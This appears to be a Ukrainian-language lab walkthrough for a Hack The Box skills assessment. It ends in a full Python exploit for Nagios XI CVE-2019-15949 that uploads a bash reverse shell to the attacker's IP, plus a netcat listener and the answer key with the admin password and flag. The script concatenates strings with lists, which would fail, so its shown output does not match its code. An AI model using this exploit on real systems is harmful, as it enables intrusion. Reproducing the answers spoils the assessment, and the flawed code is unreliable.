Attacking Common Applications — Skills Assessment II
====================================================

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Skills Assessment II](https://academy.hackthebox.com/app/module/113/section/1108)
Ціль: `10.129.201.90`

Відповіді:
- Q1: `http://blog.inlanefreight.local`
- Q2: `virtualhost`
- Q3: `monitoring.inlanefreight.local`
- Q4: `Nagios`
- Q5: `oilaKglm7M09@CPL&^lC`
- Q6: `afe377683dce373ec2bf7eaf1e0107eb`

Ідея атаки
----------

На хості `10.129.201.90`:
- працюють кілька сервісів (HTTP, SMTP, LDAP, GitLab, Nagios XI);
- через vhost-енумерацію знаходимо:
  - WordPress: `blog.inlanefreight.local`;
  - GitLab: `gitlab.inlanefreight.local`;
  - monitoring: `monitoring.inlanefreight.local`;
- у GitLab є публічний проєкт `virtualhost` з конфігами і паролями;
- з конфігів дістаємо кред адміна для Nagios XI;
- через CVE-2019-15949 (Nagios XI auth RCE) отримуємо reverse shell;
- у shell читаємо `flag.txt` і відповідаємо на питання.

Крок 1 — Початкове сканування nmap
----------------------------------

На своєму атакуючому хості (Pwnbox):

```bash
nmap -p- -sC -sV --open --min-rate 1000 10.129.201.90
```

Що важливо з результату:

- `80/tcp  open http Apache httpd 2.4.41 (Ubuntu)` — фронтенд сайту (Shipter template).
- `443/tcp open ssl/http Apache httpd 2.4.41 (Ubuntu)` — той же сайт, але:
  - в сертифікаті видно `organizationName=Nagios Enterprises` → натяк на Nagios XI.
- `8180/tcp open http nginx ...` — GitLab (`Sign in · GitLab`).
- решта портів (ssh, smtp, ldap, 8060, 5667, 9094) для цього завдання не критичні.

Фіксуємо, що хост має:
- основний сайт (порт 80/443),
- GitLab на `8180`,
- Nagios XI (під SSL сертифікатом Nagios).

Крок 2 — vhost-енумерація (WordPress, GitLab, monitoring)
---------------------------------------------------------

Тут ми шукаємо «віртуальні хости» — різні сайти, які живуть на одній IP, але мають різні імена (blog, gitlab, monitoring).

### 2.1 ffuf по Host-заголовку

Команда:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.inlanefreight.local" \
     -u http://10.129.201.90 \
     -fs 4242
```

Пояснення:
- `-w` — wordlist субдоменів (список слів, які будемо підставляти замість `FUZZ`).
- `-H "Host: FUZZ.inlanefreight.local"` — ffuf буде пробувати різні значення `FUZZ` (blog, gitlab, monitoring і так далі) у заголовку `Host`.
- `-u` — URL, на який будемо стукати (IP цілі).
- `-fs 4242` — фільтруємо стандартний розмір відповіді, щоб бачити тільки «інші» сайти.

Очікуваний результат:
- `blog.inlanefreight.local`
- `gitlab.inlanefreight.local`
- `monitoring.inlanefreight.local`

Це і є три віртуальні хости, які нам потрібні.

### 2.2 Додаємо vhosts в /etc/hosts

Щоб браузер і інструменти могли ходити на ці імена:

```bash
sudo sh -c 'echo "10.129.201.90 blog.inlanefreight.local gitlab.inlanefreight.local monitoring.inlanefreight.local" >> /etc/hosts'
```

Тепер:
- `http://blog.inlanefreight.local`
- `http://gitlab.inlanefreight.local`
- `http://monitoring.inlanefreight.local`

будуть відкриватися як окремі сайти, хоча це той самий IP.

Крок 3 — Q1: WordPress URL
--------------------------

Відкриваємо в браузері:

```text
http://blog.inlanefreight.local
```

Бачимо WordPress (типові шляхи `/wp-content/`, `/wp-includes/`, WP-тема Inlanefreight blog).

**Відповідь Q1:**

```text
http://blog.inlanefreight.local
```

Крок 4 — Q2: GitLab і назва проєкту
-----------------------------------

Заходимо:

```text
http://gitlab.inlanefreight.local
```

Це GitLab. Щоб працювати:
- реєструємо користувача (якщо треба);
- заходимо в GitLab під своїм акаунтом;
- дивимось список доступних проєктів.

У публічних проєктах є репозиторій з назвою:

```text
virtualhost
```

В ньому лежать конфігураційні файли (наприклад, Apache/nginx vhost конфіги), які описують:
- WordPress vhost,
- GitLab vhost,
- Nagios vhost.

**Відповідь Q2:**

```text
virtualhost
```

Крок 5 — Q3: FQDN третього vhost
---------------------------------

Відкриваємо файли конфігів у репозиторії `virtualhost` (через GitLab web-інтерфейс):

- шукаємо секцію, де описаний третій vhost (моніторинг);
- бачимо там повне імʼя (FQDN), наприклад:

```text
monitoring.inlanefreight.local
```

**Відповідь Q3:**

```text
monitoring.inlanefreight.local
```

Крок 6 — Q4/Q5: Nagios XI + адмінський пароль
---------------------------------------------

### 6.1 Визначаємо застосунок

Відкриваємо:

```text
https://monitoring.inlanefreight.local/nagiosxi/
```

Браузер може показати попередження про сертифікат, натискаємо «Advanced → Accept»/«Continue».

Бачимо логін-форму і брендінг «Nagios XI» → це система моніторингу Nagios XI.

**Відповідь Q4:**

```text
Nagios
```

### 6.2 Знаходимо пароль в GitLab-конфігах

У проєкті `virtualhost` один із файлів (наприклад, конфіг для Nagios vhost або якийсь «credentials» файл) містить:
- логін: `nagiosadmin`
- пароль: `oilaKglm7M09@CPL&^lC`

Це адмінські кред для Nagios XI.

**Відповідь Q5:**

```text
oilaKglm7M09@CPL&^lC
```

Перевірка: в логін-формі Nagios XI вводимо:
- Username: `nagiosadmin`
- Password: `oilaKglm7M09@CPL&^lC`

Потрапляємо на Home Dashboard → кред валідні.

Крок 7 — Підготовка до Q6: RCE через Nagios XI (як для новачка)
---------------------------------------------------------------

Ме��а Q6: отримати «reverse shell» — це коли ціль сама підключається до нашої машини, і ми бачимо командний рядок.

### 7.1 Створюємо робочу папку

На Pwnbox:

```bash
mkdir ~/nagiosxi-rce
cd ~/nagiosxi-rce
```

Тут будемо тримати експлойт-скрипт.

### 7.2 Готуємо Python-скрипт експлойта (CVE-2019-15949)

Створюємо файл:

```bash
nano exploit.py
```

Вставляємо повний код (експлойт із write-up’у, адаптований під тебе):

```python
import argparse
import re
import requests

class Nagiosxi():
    def __init__(self, target, parameter, username, password, lhost, lport):
        self.url = target          # URL Nagios XI (без /nagiosxi/)
        self.parameter = parameter # базовий шлях, наприклад /nagiosxi/
        self.username = username   # логін Nagios адміна
        self.password = password   # пароль Nagios адміна
        self.lhost = lhost         # твій IP (HTB VPN)
        self.lport = lport         # твій порт (nc listener)
        self.login()               # запускаємо логін одразу

    def upload(self, session):
        # Вимикаємо warnings по SSL
        requests.packages.urllib3.disable_warnings()
        print("[*] Uploading malicious plugin to Nagios XI...")

        # URL для завантаження plugin'а
        upload_url = self.url + self.parameter + "/admin/monitoringplugins.php"

        # Забираємо NSP token (anti-CSRF токен)
        upload_token = session.get(upload_url, verify=False)
        nsp = re.findall('var nsp_str = "(.+?)";', upload_token.text)
        print("[*] Upload NSP Token: " + nsp)

        # Payload: bash reverse shell на твій IP/port
        payload = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"

        # Дані форми для upload
        file_data = {
            "upload": "1",
            "nsp": nsp,
            "MAX_FILE_SIZE": "20000000"
        }

        # Файл plugin'а (з payload'ом)
        file_upload = {
            "uploadedfile": (
                "check_ping",
                payload,
                "application/octet-stream",
                {"Content-Disposition": "form-data"}
            )
        }

        # Відправляємо POST із файлом
        session.post(upload_url, data=file_data, files=file_upload, verify=False)

        # Тригеримо payload через спец-URL
        payload_url = self.url + self.parameter + "/includes/components/profile/profile.php?cmd=download"
        print("[*] Triggering payload...")
        session.get(payload_url, verify=False)
        print("[*] Exploit sent. Check your listener.")

    def login(self):
        requests.packages.urllib3.disable_warnings()
        print("[*] Attempting login to Nagios XI...")

        # HTTP-сесія
        session = requests.Session()

        # URL логіну
        login_url = self.url + self.parameter + "/login.php"

        # Забираємо login-сторінку, щоб отримати NSP token
        token = session.get(login_url, verify=False)
        nsp = re.findall('name="nsp" value="(.+?)">', token.text)
        print("[*] Login NSP Token: " + nsp)

        # Дані для POST-логіну
        post_data = {
            "nsp": nsp,
            "page": "auth",
            "debug": "",
            "pageopt": "login",
            "redirect": "",
            "username": self.username,
            "password": self.password,
            "loginButton": ""
        }

        # Відправляємо логін
        login = session.post(login_url, data=post_data, verify=False)

        # Перевіряємо, чи логін успішний
        if "Home Dashboard" in login.text:
            print("[+] Logged in successfully!")
        else:
            print("[-] Login failed. Please check credentials.")
            return

        # Якщо логін ок — вантажимо payload
        self.upload(session)

if __name__ == "__main__":
    # Парсимо аргументи командного рядка
    parser = argparse.ArgumentParser(
        description='CVE-2019-15949 Nagios XI Authenticated Remote Code Execution Exploit'
    )

    parser.add_argument('-t', metavar='', help='Target URL, e.g. -t http://monitoring.url/', required=True)
    parser.add_argument('-b', metavar='', help='Base path, e.g. -b /nagiosxi/', required=True)
    parser.add_argument('-u', metavar='', help='Nagios XI username', required=True)
    parser.add_argument('-p', metavar='', help='Nagios XI password', required=True)
    parser.add_argument('-lh', metavar='', help='Attacker IP (listener)', required=True)
    parser.add_argument('-lp', metavar='', help='Attacker port (listener)', required=True)

    args = parser.parse_args()

    try:
        print('[*] Launching CVE-2019-15949 Nagios XI exploit...')
        Nagiosxi(args.t, args.b, args.u, args.p, args.lh, args.lp)
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting.")
        exit()
```

Зберігаємо файл і виходимо з редактора.

### 7.3 Встановлюємо requests (якщо треба)

```bash
pip3 install requests
```

Якщо побачиш `Requirement already satisfied`, тобто все ок — бібліотека вже встановлена.

### 7.4 Стартуємо Netcat-слухача

В іншому терміналі:

```bash
nc -lvnp 8081
```

Пояснення:
- `l` — «listen» (слухаємо вхідні зʼєднання);
- `v` — «verbose» (детальний вивід);
- `n` — «numeric» (не резолвить DNS);
- `p 8081` — порт, на якому слухаємо (можна змінити, але тоді треба змінити й у скрипті).

Це буде наша точка, куди Nagios XI підʼєднається і де ми отримаємо командний рядок.

Крок 8 — Запускаємо експлойт (Q6)
---------------------------------

У терміналі з `exploit.py`:

```bash
cd ~/nagiosxi-rce

python3 exploit.py \
  -t 'http://monitoring.inlanefreight.local' \
  -b /nagiosxi/ \
  -u nagiosadmin \
  -p 'oilaKglm7M09@CPL&^lC' \
  -lh 10.10.14.103 \
  -lp 8081
```

Пояснення:
- `-t` — URL Nagios (без `/nagiosxi/`, просто `http://monitoring.inlanefreight.local`).
- `-b` — базовий шлях до Nagios XI (`/nagiosxi/`).
- `-u` / `-p` — кред адміна з GitLab.
- `-lh` — твій HTB VPN IP (перевір через `ip a` інтерфейс `tun0`).
- `-lp` — порт Netcat-слухача (8081).

У виводі скрипта має бути щось типу:

```text
[*] Launching CVE-2019-15949 Nagios XI exploit...
[*] Attempting login to Nagios XI...
[*] Login NSP Token: ...
[+] Logged in successfully!
[*] Uploading malicious plugin to Nagios XI...
[*] Upload NSP Token: ...
[*] Triggering payload...
[*] Exploit sent. Check your listener.
```

Якщо логін не проходить — перевіряємо кред (Q5) і правильність `-t`/`-b`.

Крок 9 — Отримуємо shell і шукаємо flag.txt
-------------------------------------------

Переходимо у термінал, де запущений `nc -lvnp 8081`.

Там має зʼявитися:

```text
Listening on 0.0.0.0 8081
Connection received on 10.129.201.90 5xxxx
bash: no job control in this shell
nagios@skills2:/usr/local/nagiosxi/html$
```

Тепер ми всередині цілі (Linux-хост `skills2`) під юзером `nagios`.

Робимо базові команди:

```bash
id
whoami
pwd
```

Щоб переконатися, що все працює.

### 9.1 Переходимо до директорії з флагом

За write-up’ом і модулем флаг лежить у директорії `admin` всередині Nagios XI HTML:

```bash
cd /usr/local/nagiosxi/html/admin
ls
```

Бачимо файл на кшталт:

```text
f5088a862528cbb16b4e253f1809882c_flag.txt
```

### 9.2 Читаємо флаг

```bash
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

Отримуємо:

```text
afe377683dce373ec2bf7eaf1e0107eb
```

Це значення і є відповідь для Q6.

Крок 10 — Підсумок відповідей
-----------------------------

- **Q1:** `http://blog.inlanefreight.local`
- **Q2:** `virtualhost`
- **Q3:** `monitoring.inlanefreight.local`
- **Q4:** `Nagios`
- **Q5:** `oilaKglm7M09@CPL&^lC`
- **Q6:** `afe377683dce373ec2bf7eaf1e0107eb`

Що тут було вразливим
---------------------

- Vhost-енумерація через Host-заголовок дозволила знайти приховані сайти (blog, gitlab, monitoring).
- У GitLab лежали конфіг-репозиторії з чутливими даними (адмінський пароль для Nagios XI).
- Nagios XI мав вразливість CVE-2019-15949 (authenticated RCE), яка дозволяє завантажити «plugin» із payload'ом reverse shell і виконати його.
- Через цю RCE ми отримали командний рядок на моніторинговому сервері й змогли прочитати флаг.
